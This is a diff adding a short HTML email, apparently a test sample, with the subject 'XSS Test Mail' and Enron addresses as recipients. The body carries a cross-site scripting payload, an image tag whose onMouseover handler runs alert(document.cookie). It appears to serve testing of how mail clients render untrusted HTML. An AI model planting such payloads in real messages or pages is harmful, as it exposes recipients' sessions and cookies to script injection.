@@ -1,0 +1,9 @@
+From: ebi <keisyu@gmail.com>
+To: j..kean@enron.com, meredith.philipp@enron.com, vance.meyer@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<html><head><meta+http-equiv="content-type"+content="text/html;+charset=UTF-8"></head><body><img+src="#"+onMouseover=alert(document.cookie)+title="tupian"+/>&nbsp;<br+/>
+&nbsp;<br+/>
+&nbsp;<br+/></body></html>
